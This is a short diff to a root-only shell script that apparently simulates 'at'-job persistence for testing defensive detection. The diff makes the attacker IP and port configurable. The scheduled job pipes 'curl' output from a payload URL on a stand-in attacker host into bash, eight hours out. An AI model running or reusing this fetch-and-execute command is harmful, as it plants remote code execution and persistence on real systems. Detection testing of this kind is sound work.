@@ -5,6 +5,8 @@
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
+ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
+ATTACKER_PORT="${ATTACKER_PORT:-80}"
 TAG="DEFENDER_TEST_AT"
 
 case "${1:-}" in
@@ -13,7 +15,7 @@ case "${1:-}" in
       echo "[-] 06_at_job: 'at' not installed (pacman -S at); skipping"
       exit 0
     fi
-    echo "$TAG=1; curl -s http://10.0.0.1/payload.sh | bash" | at "now + 8 hours" 2>/dev/null
+    echo "$TAG=1; curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/payload.sh | bash" | at "now + 8 hours" 2>/dev/null
     echo "[+] 06_at_job: fetch-and-execute job scheduled 8 hours out"
     ;;
   cleanup)
